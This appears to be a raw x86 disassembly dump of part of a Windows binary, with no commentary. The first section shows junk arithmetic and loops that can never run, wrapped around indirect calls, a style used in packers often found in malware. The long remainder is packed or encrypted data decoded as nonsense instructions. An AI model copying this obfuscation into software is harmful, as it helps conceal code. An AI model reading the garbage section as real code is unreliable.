  40f2e9:	mov    eax,DWORD PTR [eax+0x18]
  40f2ec:	mov    DWORD PTR [ebp-0x24],eax
  40f2ef:	sub    DWORD PTR ds:0x42b000,0x5870
  40f2f9:	mov    eax,DWORD PTR [ebp-0x14]
  40f2fc:	movzx  ecx,WORD PTR ds:0x42a010
  40f303:	sbb    DWORD PTR ds:0x42c004,ecx
  40f309:	mov    ecx,DWORD PTR [ebp+0x8]
  40f30c:	add    ecx,DWORD PTR [eax+0x20]
  40f30f:	and    DWORD PTR ds:0x42b010,0x0
  40f319:	jmp    0x40f329
  40f31e:	mov    eax,ds:0x42b010
  40f323:	inc    eax
  40f324:	mov    ds:0x42b010,eax
  40f329:	cmp    DWORD PTR ds:0x42b010,0x15
  40f330:	jae    0x40f35d
  40f336:	cmp    DWORD PTR ds:0x42b010,0x1a
  40f33d:	jb     0x40f35d
  40f343:	jmp    0x40f358
  40f348:	push   0x42b01c
  40f34d:	push   0x6b11
  40f352:	call   DWORD PTR ds:0x43000f
  40f358:	jmp    0x40f31e
  40f35d:	mov    DWORD PTR [ebp-0x2c],ecx
  40f360:	xor    DWORD PTR ds:0x42a014,edi
  40f366:	mov    eax,DWORD PTR [ebp-0x14]
  40f369:	mov    DWORD PTR ds:0x42c014,0x19
  40f373:	cmp    DWORD PTR ds:0x42c014,0x0
  40f37a:	je     0x40f3c4
  40f380:	cmp    DWORD PTR ds:0x42c014,0x5
  40f387:	jbe    0x40f3c4
  40f38d:	jmp    0x40f398
  40f392:	call   DWORD PTR ds:0x430013
  40f398:	cmp    DWORD PTR ds:0x42c014,0x6
  40f39f:	jne    0x40f3b2
  40f3a5:	mov    ecx,DWORD PTR ds:0x42c014
  40f3ab:	dec    ecx
  40f3ac:	mov    DWORD PTR ds:0x42c014,ecx
  40f3b2:	mov    ecx,DWORD PTR ds:0x42c014
  40f3b8:	dec    ecx
  40f3b9:	mov    DWORD PTR ds:0x42c014,ecx
  40f3bf:	jmp    0x40f373
  40f3c4:	mov    ecx,DWORD PTR [ebp+0x8]
  40f3c7:	inc    DWORD PTR ds:0x42a014
  40f3cd:	add    ecx,DWORD PTR [eax+0x24]
  40f3d0:	sbb    DWORD PTR ds:0x42d000,0x42b014
  40f3da:	mov    DWORD PTR [ebp-0x34],ecx
  40f3dd:	mov    eax,DWORD PTR [ebp-0x14]
  40f3e0:	mov    ecx,DWORD PTR ds:0x42c00c
  40f3e6:	sub    DWORD PTR ds:0x42a018,ecx
  40f3ec:	mov    ecx,DWORD PTR [ebp+0x8]
  40f3ef:	sub    DWORD PTR ds:0x42c008,0x42b004
  40f3f9:	add    ecx,DWORD PTR [eax+0x1c]
  40f3fc:	mov    DWORD PTR [ebp-0x14],ecx
  40f3ff:	mov    DWORD PTR ds:0x42c01c,0x38b0
  40f409:	jmp    0x411884
  40f40e:	sub    DWORD PTR ds:0x42a000,ebx
  40f414:	mov    eax,DWORD PTR [ebp-0x2c]
  40f417:	mov    ecx,DWORD PTR ds:0x42e010
  40f41d:	mov    ecx,DWORD PTR [ecx]
  40f41f:	adc    DWORD PTR ds:0x42d014,ecx
  40f425:	mov    ecx,DWORD PTR [ebp+0x8]
  40f428:	and    DWORD PTR ds:0x42a000,0x732c
  40f432:	add    ecx,DWORD PTR [eax+ebx*4]
  40f435:	add    DWORD PTR ds:0x429018,ebx
  40f43b:	mov    DWORD PTR [ebp-0x28],ecx
  40f43e:	xor    DWORD PTR ds:0x42d00c,ecx
  40f444:	mov    eax,DWORD PTR [ebp-0x4]
  40f447:	and    DWORD PTR ds:0x42a010,0x0
  40f451:	jmp    0x40f463
  40f456:	mov    ecx,DWORD PTR ds:0x42a010
  40f45c:	inc    ecx
  40f45d:	mov    DWORD PTR ds:0x42a010,ecx
  40f463:	cmp    DWORD PTR ds:0x42a010,0x13
  40f46a:	jae    0x40f497
  40f470:	cmp    DWORD PTR ds:0x42a010,0x1c
  40f477:	jle    0x40f497
  40f47d:	jmp    0x40f492
  40f482:	push   0x42f181
  40f487:	push   0x0
  40f489:	push   DWORD PTR [ebp-0x18]
  40f48c:	call   DWORD PTR ds:0x430017
  40f492:	jmp    0x40f456
  40f497:	mov    ecx,DWORD PTR [ebp-0x28]
  40f49a:	and    DWORD PTR ds:0x42b000,0x42d018
  40f4a4:	xor    eax,esi
  40f4a6:	inc    DWORD PTR ds:0x42c000
  40f4ac:	add    eax,edi
  40f4ae:	cmp    ecx,eax
  40f4b0:	jmp    0x411846
  40f4b5:	push   esp
  40f4b6:	push   edx
  40f4b7:	or     eax,0x17250f6a
  40f4bc:	inc    esp
  40f4bd:	xor    ch,dh
  40f4bf:	xor    ebx,edi
  40f4c1:	mov    eax,0xce99c855
  40f4c6:	scas   eax,DWORD PTR es:[edi]
  40f4c7:	jp     0x40f543
  40f4c9:	add    eax,0xc97a7a5f
  40f4ce:	and    cl,BYTE PTR [ebx]
  40f4d0:	xchg   esi,eax
  40f4d1:	and    DWORD PTR [edi+ebx*4],eax
  40f4d4:	fsubr  st(1),st
  40f4d6:	mov    cl,0xb0
  40f4d8:	inc    esi
  40f4d9:	out    0xdc,eax
  40f4db:	cmc    
  40f4dc:	call   0xa349cc96
  40f4e1:	addr16 mov cs,edi
  40f4e4:	mov    ds:0xee7fc6b7,eax
  40f4e9:	call   0x1fae47a7
  40f4ee:	ss mov ebx,ds
  40f4f1:	push   ss
  40f4f2:	push   ss
  40f4f3:	pusha  
  40f4f4:	lea    ebx,[eax+0x13]
  40f4f7:	fsubr  DWORD PTR [edi+0xa]
  40f4fa:	fwait
  40f4fb:	adc    DWORD PTR [ebx+0x3f9d5cdf],edx
  40f501:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f502:	rol    BYTE PTR [ecx+0x5e715221],0x10
  40f509:	clc    
  40f50a:	xor    BYTE PTR [edi+0x7287739],0x22
  40f511:	jg     0x40f53f
  40f513:	add    eax,0xdad74a6a
  40f518:	test   BYTE PTR [ebx-0x46],bl
  40f51b:	xor    al,0x2c
  40f51d:	dec    edi
  40f51e:	ret    0x7e01
  40f521:	mov    es,ebx
  40f523:	ins    DWORD PTR es:[edi],dx
  40f524:	dec    esi
  40f525:	pushf  
  40f526:	inc    ebx
  40f527:	mov    esi,0x2e0e09d4
  40f52c:	bound  ecx,QWORD PTR [edi+0x1]
  40f52f:	sbb    ah,cl
  40f531:	jno    0x40f596
  40f533:	and    al,0x17
  40f535:	dec    DWORD PTR [ecx]
  40f537:	lods   eax,DWORD PTR ds:[esi]
  40f538:	sbb    ch,al
  40f53a:	add    al,dl
  40f53c:	je     0x40f5ad
  40f53e:	and    BYTE PTR [ebx],al
  40f540:	and    eax,0xc89a1344
  40f545:	sub    al,0x7a
  40f547:	dec    esp
  40f548:	mov    al,ds:0x1a6ea979
  40f54d:	lahf   
  40f54e:	frstor [eax]
  40f550:	ds pop ss
  40f552:	cmc    
  40f553:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f554:	out    0x5f,al
  40f556:	in     al,0x49
  40f558:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f559:	jecxz  0x40f5b7
  40f55b:	pop    eax
  40f55c:	inc    esi
  40f55d:	mov    edi,DWORD PTR [esi+ebx*8]
  40f560:	pop    ds
  40f561:	popa   
  40f562:	jmp    0x40f55a
  40f564:	fwait
  40f565:	mov    eax,ds:0xf8ecabb0
  40f56a:	shr    BYTE PTR ds:[ebp-0x19],cl
  40f56e:	(bad)  
  40f56f:	mov    al,0x2c
  40f571:	lods   eax,DWORD PTR ds:[esi]
  40f572:	iret   
  40f573:	les    ebx,FWORD PTR [ecx]
  40f575:	dec    ebp
  40f576:	sub    DWORD PTR [ebx+0x62afb009],ebx
  40f57c:	ins    DWORD PTR es:[edi],dx
  40f57d:	mov    ds:0xb1686e6f,eax
  40f582:	sub    BYTE PTR gs:[esi+0x6f],dl
  40f586:	xchg   ebx,eax
  40f587:	mov    cs,WORD PTR [eax-0x17]
  40f58a:	sbb    al,0x53
  40f58c:	cld    
  40f58d:	jne    0x40f5fb
  40f58f:	mov    esp,0x6b453371
  40f594:	sub    DWORD PTR [ebp+eiz*1-0x52],eax
  40f598:	stc    
  40f599:	les    eax,FWORD PTR [edi+edi*8-0x17]
  40f59d:	cmp    dl,BYTE PTR [edi-0x6e]
  40f5a0:	mov    ecx,0x4d26d330
  40f5a5:	pop    ss
  40f5a6:	push   esi
  40f5a7:	gs jno 0x40f555
  40f5aa:	inc    eax
  40f5ab:	xchg   edx,eax
  40f5ac:	call   0xd7de:0x30b4b0e2
  40f5b3:	ins    DWORD PTR es:[edi],dx
  40f5b4:	call   0x56373843
  40f5b9:	jmp    0x11ce:0x739aa0e
  40f5c0:	arpl   bx,cx
  40f5c2:	mov    cl,0xd
  40f5c4:	pop    ebp
  40f5c5:	adc    al,0xdf
  40f5c7:	cwde   
  40f5c8:	mov    eax,ds:0x77250dae
  40f5cd:	dec    eax
  40f5ce:	sub    esp,edx
  40f5d0:	outs   dx,DWORD PTR ds:[esi]
  40f5d1:	fwait
  40f5d2:	sbb    eax,0x42a6146f
  40f5d7:	xchg   ebx,eax
  40f5d8:	push   ebx
  40f5d9:	in     eax,0x68
  40f5db:	add    esi,DWORD PTR [edx-0x4a]
  40f5de:	gs stc 
  40f5e0:	out    dx,eax
  40f5e1:	or     al,0xfd
  40f5e3:	mov    ecx,0x89ff217d
  40f5e8:	call   0x8a074de0
  40f5ed:	or     bl,0x86
  40f5f0:	sub    edx,ebx
  40f5f2:	mov    al,ds:0xb88e0d36
  40f5f7:	ja     0x40f650
  40f5f9:	xor    eax,0x7d8452fd
  40f5fe:	jecxz  0x40f5fb
  40f600:	adc    ah,0x19
  40f603:	dec    esi
  40f604:	cmp    al,0xf7
  40f606:	sar    edi,1
  40f608:	imul   ecx,ecx,0xffffffdc
  40f60b:	inc    ebx
  40f60c:	inc    ecx
  40f60d:	hlt    
  40f60e:	lds    ebp,FWORD PTR [edi+0x57]
  40f611:	cs mov al,0xb6
  40f614:	loop   0x40f65a
  40f616:	retf   0x621d
  40f619:	mov    dl,0xd4
  40f61b:	jno    0x40f5d0
  40f61d:	adc    edi,DWORD PTR [edx]
  40f61f:	jle    0x40f65d
  40f621:	push   0x5d
  40f623:	sub    eax,0x7861362e
  40f628:	pop    esp
  40f629:	sti    
  40f62a:	and    al,0x81
  40f62c:	mov    bh,0xb5
  40f62e:	sti    
  40f62f:	test   BYTE PTR [eax+0x6000534f],0x8e
  40f636:	lahf   
  40f637:	push   es
  40f638:	call   0x84c92ae9
  40f63d:	retf   0x4820
  40f640:	cmp    dh,BYTE PTR [ebx-0x75]
  40f643:	in     eax,0xf0
  40f645:	iret   
  40f646:	in     eax,0x74
  40f648:	mov    WORD PTR [edi],?
  40f64a:	scas   al,BYTE PTR es:[edi]
  40f64b:	push   edi
  40f64c:	fdivr  QWORD PTR [eax-0x35]
  40f64f:	xor    esp,DWORD PTR [ebp-0x3105bfee]
  40f655:	inc    edi
  40f656:	add    DWORD PTR [edi],edi
  40f658:	(bad)  
  40f659:	cli    
  40f65a:	sbb    DWORD PTR [eax-0x5da32965],ecx
  40f660:	test   BYTE PTR [esp+ebx*1-0x63beef36],dl
  40f667:	jg     0x40f608
  40f669:	retf   
  40f66a:	(bad)  
  40f66b:	sbb    al,0x4e
  40f66d:	push   ss
  40f66e:	sbb    BYTE PTR [edi+edi*8],ah
  40f671:	and    BYTE PTR [ecx-0x76031f40],dh
  40f677:	push   ebp
  40f678:	lods   al,BYTE PTR ds:[esi]
  40f679:	mov    dl,0xb5
  40f67b:	inc    esp
  40f67c:	adc    BYTE PTR [edi-0x55],cl
  40f67f:	popa   
  40f680:	fsubr  QWORD PTR [edx+eiz*8]
  40f683:	jge    0x40f69a
  40f685:	and    al,0x4
  40f687:	push   esi
  40f688:	mov    BYTE PTR [ebx],dl
  40f68a:	pop    esi
  40f68b:	and    ebp,DWORD PTR [edx+ecx*8]
  40f68e:	and    dh,ch
  40f690:	stos   BYTE PTR es:[edi],al
  40f691:	in     al,0xba
  40f693:	in     al,0xf8
  40f695:	idiv   DWORD PTR [ebx+0x43b0dc63]
  40f69b:	add    eax,ebx
  40f69d:	test   eax,0x60a9765a
  40f6a2:	std    
  40f6a3:	jmp    0x40f6cd
  40f6a5:	(bad)  
  40f6a6:	mov    ebx,0x497e72bb
  40f6ab:	outs   dx,DWORD PTR ds:[esi]
  40f6ac:	dec    ecx
  40f6ad:	cmc    
  40f6ae:	jg     0x40f63e
  40f6b0:	lods   al,BYTE PTR ds:[esi]
  40f6b1:	sub    dh,BYTE PTR [ecx]
  40f6b3:	mov    ebx,esi
  40f6b5:	jecxz  0x40f6df
  40f6b7:	or     BYTE PTR [edi+0x51],0x6
  40f6bb:	test   BYTE PTR [ebx+ebp*8],ch
  40f6be:	outs   dx,BYTE PTR ds:[esi]
  40f6bf:	out    dx,eax
  40f6c0:	push   ecx
  40f6c1:	push   ebx
  40f6c2:	or     ebx,DWORD PTR [edx]
  40f6c4:	or     BYTE PTR [edi+0x7c5867af],dh
  40f6ca:	jmp    0x40f6e4
  40f6cc:	jo     0x40f6bf
  40f6ce:	xor    DWORD PTR [eax],ecx
  40f6d0:	or     DWORD PTR [eax-0x4c],ebp
  40f6d3:	mov    ch,0x86
  40f6d5:	dec    edx
  40f6d6:	shr    DWORD PTR [edi+0x7da77885],0xbe
  40f6dd:	sub    al,0xac
  40f6df:	mov    al,ds:0x113526a3
  40f6e4:	(bad)  
  40f6e6:	daa    
  40f6e7:	inc    esp
  40f6e8:	xor    ecx,DWORD PTR [esi+ebx*8]
  40f6eb:	fadd   DWORD PTR [eax+0x4c]
  40f6ee:	repz pop ebp
  40f6f0:	adc    DWORD PTR [ecx-0x20e89b06],0x6
  40f6f7:	iret   
  40f6f8:	pop    esp
  40f6f9:	outs   dx,BYTE PTR ds:[esi]
  40f6fa:	outs   dx,BYTE PTR ds:[esi]
  40f6fb:	push   esi
  40f6fc:	inc    edi
  40f6fd:	push   es
  40f6fe:	ja     0x40f762
  40f700:	xor    esi,edx
  40f702:	stos   DWORD PTR es:[edi],eax
  40f703:	fadd   QWORD PTR [ecx]
  40f705:	fdivr  QWORD PTR [eax-0x24fff005]
  40f70b:	mov    dl,0xc1
  40f70d:	pop    esp
  40f70e:	lahf   
  40f70f:	jne    0x40f6d5
  40f711:	cmp    ebp,ecx
  40f713:	scas   eax,DWORD PTR es:[edi]
  40f714:	mov    ebx,0x2aeaeae7
  40f719:	iret   
  40f71a:	mov    ah,0x5e
  40f71c:	pop    edx
  40f71d:	retf   
  40f71e:	inc    eax
  40f71f:	adc    DWORD PTR [ebp+0x6114cb89],eax
  40f725:	cmp    al,0x6
  40f727:	adc    esp,esp
  40f729:	retf   0x9711
  40f72c:	pop    es
  40f72d:	inc    esi
  40f72e:	mov    bh,0x3c
  40f730:	xchg   esi,eax
  40f731:	outs   dx,BYTE PTR ds:[esi]
  40f732:	out    dx,al
  40f733:	jbe    0x40f6d5
  40f735:	adc    esp,edx
  40f737:	out    dx,al
  40f738:	mov    dl,0x27
  40f73a:	and    DWORD PTR [ecx],ebp
  40f73c:	nop
  40f73d:	cmc    
  40f73e:	mov    dl,0xdc
  40f740:	push   ebp
  40f741:	jp     0x40f782
  40f743:	mov    DWORD PTR [ebx+ebp*1],eax
  40f746:	push   ebx
  40f747:	mov    DWORD PTR [edi-0xa375510],ebx
  40f74d:	push   ss
  40f74e:	xchg   edi,eax
  40f74f:	enter  0xad0,0x69
  40f753:	shr    DWORD PTR [ebx],1
  40f755:	sbb    al,0xd9
  40f757:	(bad)  
  40f759:	push   ebp
  40f75a:	rol    edx,0xc6
  40f75d:	mov    edx,DWORD PTR [ecx-0x7cbf7b5f]
  40f763:	das    
  40f764:	pop    ss
  40f765:	sbb    edx,DWORD PTR [ebx-0x72ae3878]
  40f76b:	fwait
  40f76c:	popf   
  40f76d:	push   edx
  40f76e:	jmp    0xa10feefd
  40f773:	out    0x1a,al
  40f775:	dec    esp
  40f776:	mov    ecx,0xa86e30d5
  40f77b:	in     eax,0x53
  40f77d:	mov    bh,0xb8
  40f77f:	pop    edx
  40f780:	repnz sub BYTE PTR cs:[esi],cl
  40f784:	scas   al,BYTE PTR es:[edi]
  40f785:	test   eax,0xd4e73f6a
  40f78a:	call   0xa2a8:0x7cca8a32
  40f791:	mov    cl,0x30
  40f793:	and    ah,BYTE PTR ds:0x21eeb3e3
  40f799:	xchg   esp,eax
  40f79a:	out    0x2d,eax
  40f79c:	test   al,0xd5
  40f79e:	adc    dl,BYTE PTR [ecx-0x5d]
  40f7a1:	es or  eax,0x88487531
  40f7a7:	sahf   
  40f7a8:	adc    BYTE PTR [ebx+eiz*1-0x6fec8d9e],bl
  40f7af:	push   ds
  40f7b0:	ficomp WORD PTR [eax+0x1a]
  40f7b3:	pop    edi
  40f7b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7b5:	mul    DWORD PTR [ecx+0x47e93daf]
  40f7bb:	js     0x40f81f
  40f7bd:	inc    ebp
  40f7be:	inc    ebp
  40f7bf:	js     0x40f782
  40f7c1:	cs cmc 
  40f7c3:	pop    esp
  40f7c4:	sub    edi,DWORD PTR [edi+0x69613786]
  40f7ca:	es aam 0xe
  40f7cd:	or     eax,0xf94df069
  40f7d2:	adc    DWORD PTR [edx+0x6e0c4142],esp
  40f7d8:	int3   
  40f7d9:	mov    edi,0xea7f0c4e
  40f7de:	inc    ebx
  40f7df:	stos   DWORD PTR es:[edi],eax
  40f7e0:	out    dx,eax
  40f7e1:	imul   edi,DWORD PTR [esi],0xfffffff3
  40f7e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7e5:	mov    edi,0x359c145e
  40f7ea:	jge    0x40f828
  40f7ec:	xor    edi,ebp
  40f7ee:	pusha  
  40f7ef:	mov    edi,0xe7ee1fc2
  40f7f4:	cmp    BYTE PTR [ebx-0x668a17fa],al
  40f7fa:	cmp    BYTE PTR [edi+0x2dd9a575],bh
  40f800:	dec    esp
  40f801:	retf   0xe2ea
  40f804:	fwait
  40f805:	rol    DWORD PTR [edi-0x2],1
  40f808:	jmp    0x40f856
  40f80a:	xchg   esp,eax
  40f80b:	cmp    ebx,esp
  40f80d:	dec    edi
  40f80e:	or     ch,BYTE PTR [ebp+0xd]
  40f811:	enter  0xdfcc,0x12
  40f815:	jnp    0x40f7aa
  40f817:	cmp    DWORD PTR es:[esi],edi
  40f81a:	sub    dl,bl
  40f81c:	stc    
  40f81d:	in     al,0x19
  40f81f:	jle    0x40f86e
  40f821:	or     al,BYTE PTR [eax-0x76]
  40f824:	mov    cs,WORD PTR [edi+ebp*1-0x53]
  40f828:	cmp    DWORD PTR [esi-0x2c4896ae],edi
  40f82e:	dec    edx
  40f82f:	jge    0x40f815
  40f831:	sbb    eax,0x2e2a70a
  40f836:	mov    al,ds:0x682ab27b
  40f83b:	xchg   edx,eax
  40f83c:	outs   dx,BYTE PTR cs:[esi]
  40f83e:	shl    DWORD PTR [edi-0x4b],1
  40f841:	imul   ebp,DWORD PTR [ecx],0x5c3c1da9
  40f847:	or     al,BYTE PTR [edx+0x11]
  40f84a:	repz pop ds
  40f84c:	pusha  
  40f84d:	xor    BYTE PTR [esi],bl
  40f84f:	pushf  
  40f850:	mov    DWORD PTR ds:0x9f9e7b50,esp
  40f856:	mov    edx,0x51ee6765
  40f85b:	hlt    
  40f85c:	push   eax
  40f85d:	or     DWORD PTR [ebp-0x1867b1c3],esp
  40f863:	inc    esp
  40f864:	scas   eax,DWORD PTR es:[edi]
  40f865:	jns    0x40f8d6
  40f867:	ja     0x40f868
  40f869:	ins    DWORD PTR es:[edi],dx
  40f86a:	cmp    BYTE PTR [ebp+eiz*1+0x2e],dl
  40f86e:	lahf   
  40f86f:	scas   eax,DWORD PTR es:[edi]
  40f870:	mov    ch,0x9e
  40f872:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f873:	rol    DWORD PTR [eax-0x36],cl
  40f876:	hlt    
  40f877:	jo     0x40f8cf
  40f879:	mov    ch,0xea
  40f87b:	or     bh,BYTE PTR [ecx+0x61]
  40f87e:	mov    fs,edi
  40f880:	mov    cl,0xb7
  40f882:	iret   
  40f883:	jne    0x40f882
  40f885:	fimul  WORD PTR [esi+0x75079a59]
  40f88b:	push   ds
  40f88c:	leave  
  40f88d:	xchg   edx,eax
  40f88e:	inc    edx
  40f88f:	pop    es
  40f890:	(bad)  
  40f892:	adc    ecx,ebx
  40f894:	xlat   BYTE PTR ds:[ebx]
  40f895:	dec    ebp
  40f896:	fdivr  st,st(4)
  40f898:	sbb    edx,DWORD PTR [ecx+0x637a389e]
  40f89e:	sbb    al,0x7f
  40f8a0:	aas    
  40f8a1:	inc    esp
  40f8a2:	jge    0x40f84f
  40f8a4:	lea    esp,[ebp-0x7ddf1a3e]
  40f8aa:	or     bh,BYTE PTR [edx+eax*2]
  40f8ad:	jl     0x40f90b
  40f8af:	(bad)  
  40f8b0:	scas   eax,DWORD PTR es:[edi]
  40f8b1:	pop    ds
  40f8b2:	imul   esi,DWORD PTR [ecx+0x2bb14433],0x1061b66
  40f8bc:	in     al,0x5
  40f8be:	jbe    0x40f884
  40f8c0:	mov    ss,WORD PTR [esi]
  40f8c2:	repz das 
  40f8c4:	(bad)  
  40f8c5:	xor    DWORD PTR [ebx+0x28],edx
  40f8c8:	mov    fs,WORD PTR [ebp+0x2a19ce1b]
  40f8ce:	std    
  40f8cf:	(bad)  
  40f8d0:	inc    esp
  40f8d1:	pop    ebp
  40f8d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8d3:	leave  
  40f8d4:	jle    0x40f88c
  40f8d6:	jnp    0x40f88a
  40f8d8:	push   0xecb63183
  40f8dd:	dec    ebx
  40f8de:	inc    ebp
  40f8df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8e0:	stos   DWORD PTR es:[edi],eax
  40f8e1:	mov    esi,0x29fd564e
  40f8e6:	xchg   esi,eax
  40f8e7:	and    DWORD PTR [eax+0x64cf625c],ecx
  40f8ed:	inc    edi
  40f8ee:	loopne 0x40f91c
  40f8f0:	in     al,dx
  40f8f1:	mov    ss,WORD PTR [ebp+0x3a24ca93]
  40f8f7:	dec    eax
  40f8f8:	adc    BYTE PTR [eax+0x6],dl
  40f8fb:	cmp    BYTE PTR [esp+ecx*8-0x6f],ah
  40f8ff:	rol    BYTE PTR [ebx+0x2c],0x53
  40f903:	inc    eax
  40f904:	xor    al,0x7f
  40f906:	jmp    0xa1237a06
  40f90b:	cwde   
  40f90c:	stc    
  40f90d:	clc    
  40f90e:	test   DWORD PTR [eax+ebp*1-0x2b],ecx
  40f912:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f913:	adc    BYTE PTR [edi-0x23],dl
  40f916:	add    DWORD PTR [ebx+eiz*2-0x7a],edx
  40f91a:	add    eax,edx
  40f91c:	or     al,0x20
  40f91e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f91f:	scas   ax,WORD PTR es:[edi]
  40f921:	push   ss
  40f922:	mov    ds:0x2a170b3b,al
  40f927:	out    dx,eax
  40f928:	pop    ecx
  40f929:	add    eax,DWORD PTR [ebp+0x4bcacd00]
  40f92f:	mov    dh,0x5c
  40f931:	jle    0x40f913
  40f933:	stos   DWORD PTR es:[edi],eax
  40f934:	call   0xe228dfdf
  40f939:	xchg   ebx,eax
  40f93a:	(bad)  
  40f93b:	fstp   TBYTE PTR [ecx+0x15b6b8b5]
  40f941:	lds    edi,FWORD PTR [esi]
  40f943:	xor    ah,ah
  40f945:	sti    
  40f946:	pop    eax
  40f947:	inc    eax
  40f948:	iret   
  40f949:	jmp    0x14d50b0a
  40f94e:	add    BYTE PTR [ecx-0x59e4ec60],ch
  40f954:	and    ch,BYTE PTR [eiz*4-0x6b3a0c8c]
  40f95b:	push   ds
  40f95c:	add    al,0xf4
  40f95e:	pop    ds
  40f95f:	dec    ecx
  40f960:	xor    al,0x4f
  40f962:	(bad)  
  40f963:	data16 and al,0x6e
  40f966:	inc    DWORD PTR [ebx]
  40f968:	add    DWORD PTR [eax-0x2dd46db0],eax
  40f96e:	js     0x40f8fa
  40f970:	(bad)  
  40f971:	(bad)  
  40f973:	ficom  DWORD PTR [edi+0x3dcdba5e]
  40f979:	lds    edi,FWORD PTR [ecx+esi*4+0x6b]
  40f97d:	inc    eax
  40f97e:	lahf   
  40f97f:	push   ebp
  40f980:	mov    esp,0x54d19737
  40f985:	out    dx,eax
  40f986:	cmp    BYTE PTR ds:0xdfe82a5a,bl
  40f98c:	pushf  
  40f98d:	jp     0x40f935
  40f98f:	push   edi
  40f990:	sub    BYTE PTR [esp+ecx*8],0xad
  40f994:	call   0x380c45ba
  40f999:	test   al,0x6
  40f99b:	ins    BYTE PTR es:[edi],dx
  40f99c:	sahf   
  40f99d:	jge    0x40f9e3
  40f99f:	mov    bh,0x4b
  40f9a1:	imul   esp,ecx,0xfffffffd
  40f9a4:	nop    esi
  40f9a7:	sub    DWORD PTR [edi],0x2d
  40f9aa:	(bad)  
  40f9ab:	(bad)
  40f9af:	pop    edi
  40f9b0:	ins    BYTE PTR es:[edi],dx
  40f9b1:	iret   
  40f9b2:	push   ecx
  40f9b3:	retf   0x3ced
  40f9b6:	(bad)  
  40f9b7:	ja     0x40fa12
  40f9b9:	popa   
  40f9ba:	aad    0xb
  40f9bc:	ins    DWORD PTR es:[edi],dx
  40f9bd:	jb     0x40f9ab
  40f9bf:	mov    ah,BYTE PTR [edx+0x51]
  40f9c2:	jp     0x40fa1e
  40f9c4:	and    BYTE PTR [edx],dl
  40f9c6:	gs adc ax,0x1aa0
  40f9cb:	xchg   ecx,eax
  40f9cc:	pop    ebx
  40f9cd:	ja     0x40f9d8
  40f9cf:	rol    ecx,0xc2
  40f9d2:	ror    DWORD PTR [edi+0x7a186ec],1
  40f9d8:	push   es
  40f9d9:	lods   eax,DWORD PTR ds:[esi]
  40f9da:	jmp    0x40f96b
  40f9dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9dd:	stos   BYTE PTR es:[edi],al
  40f9de:	sub    esp,edx
  40f9e0:	fdiv   QWORD PTR [edx-0x42d3fe58]
  40f9e6:	adc    al,0xfe
  40f9e8:	inc    ebx
  40f9e9:	test   DWORD PTR [eax+0x32],0x12ea72f4
  40f9f0:	rcl    ebx,cl
  40f9f2:	pop    ecx
  40f9f3:	hlt    
  40f9f4:	rcr    BYTE PTR [edx+ecx*8-0x4],cl
  40f9f8:	out    dx,al
  40f9f9:	rcr    esi,0xbc
  40f9fc:	adc    BYTE PTR ds:[ebx-0x59],dh
  40fa00:	in     eax,dx
  40fa01:	pop    ecx
  40fa02:	popa   
  40fa03:	xchg   ebx,eax
  40fa04:	pop    es
  40fa05:	jmp    0x37bd5b37
  40fa0a:	in     al,dx
  40fa0b:	and    DWORD PTR [esi+edi*4+0x65],0x709af059
  40fa13:	dec    edi
  40fa14:	clc    
  40fa15:	inc    ebp
  40fa16:	mov    edx,0xa5933cf2
  40fa1b:	sub    DWORD PTR [esi],edx
  40fa1d:	pop    esi
  40fa1e:	inc    esp
  40fa1f:	lock xor dl,dh
  40fa22:	test   al,0x42
  40fa24:	arpl   WORD PTR [ecx-0x39883cc1],bx
  40fa2a:	add    BYTE PTR [eax],bl
  40fa2c:	aaa    
  40fa2d:	in     al,dx
  40fa2e:	mov    WORD PTR [edx-0x26],cs
  40fa31:	test   BYTE PTR [edi-0xd],dl
  40fa34:	in     eax,0x89
  40fa36:	in     eax,0xef
  40fa38:	fistp  DWORD PTR [edi-0x7e]
  40fa3b:	ins    DWORD PTR es:[edi],dx
  40fa3c:	jmp    0x40f9d9
  40fa3e:	jbe    0x40fa10
  40fa40:	push   edx
  40fa41:	popa   
  40fa42:	xor    ecx,DWORD PTR [esi-0x24aa1423]
  40fa48:	inc    eax
  40fa49:	push   cs
  40fa4a:	xchg   DWORD PTR [ecx],ecx
  40fa4c:	fs sub ecx,esi
  40fa4f:	mov    edx,DWORD PTR [esi]
  40fa51:	xor    al,0x0
  40fa53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa54:	and    DWORD PTR [edx],eax
  40fa56:	adc    eax,0xaee0a73
  40fa5b:	mov    bh,0x28
  40fa5d:	pop    eax
  40fa5e:	xor    edi,DWORD PTR [ecx+eiz*1+0x3d1241e3]
  40fa65:	mov    edx,0x90ad10f7
  40fa6a:	(bad)  
  40fa6b:	call   0x89e0:0x86a4c380
  40fa72:	call   0xc0f5ec56
  40fa77:	pop    esp
  40fa78:	pop    ss
  40fa79:	imul   edx,DWORD PTR [ebx],0xdbb49e81
  40fa7f:	sti    
  40fa80:	aam    0xb0
  40fa82:	push   cs
  40fa83:	inc    ecx
  40fa84:	fs cmp ah,al
  40fa87:	imul   ebp,eax,0x76
  40fa8a:	sub    eax,0x5d885245
  40fa8f:	pop    edx
  40fa90:	icebp  
  40fa91:	scas   al,BYTE PTR es:[edi]
  40fa92:	popf   
  40fa93:	xor    bh,BYTE PTR ds:0xd7fadd25
  40fa99:	pusha  
  40fa9a:	mov    ebx,0xf3f94e2b
  40fa9f:	mov    WORD PTR [ebx+ebp*8],ds
  40faa2:	addr16 shr ch,cl
  40faa5:	in     al,dx
  40faa6:	je     0x40faaf
  40faa8:	outs   dx,DWORD PTR ds:[esi]
  40faa9:	and    ecx,DWORD PTR [esi-0x20f5ec62]
  40faaf:	lods   eax,DWORD PTR ds:[esi]
  40fab0:	jne    0x40fa3d
  40fab2:	push   cs
  40fab3:	fwait
  40fab4:	push   0xffffffc1
  40fab6:	lods   al,BYTE PTR ds:[esi]
  40fab7:	dec    edi
